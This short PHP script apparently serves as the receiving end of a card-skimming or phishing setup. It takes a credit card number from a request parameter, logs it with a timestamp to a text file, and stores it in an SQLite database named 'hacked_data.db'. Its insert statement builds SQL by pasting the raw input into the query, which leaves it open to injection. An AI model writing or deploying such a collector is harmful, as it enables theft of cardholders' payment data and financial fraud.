<?php
$date = new DateTime();
$date = $date->format("y:m:d h:i:s");

$myfile = fopen("log.txt", "a") or die("Unable to open file!");
fwrite($myfile, "[".$date."]");
fwrite($myfile, "  CreditCard: ".$_REQUEST["ccnum"]."\n");
  try
{
  //open the database
  $db = new PDO('sqlite:hacked_data.db');
  $ccnum = $_REQUEST["ccnum"];
  //Insert record
  $db->exec("INSERT INTO credit_nums (ccnum) VALUES ('$ccnum');");
  $db = NULL;
  }
    catch(PDOException $e)
  {
  print 'Exception : ' .$e->getMessage();
}
?>
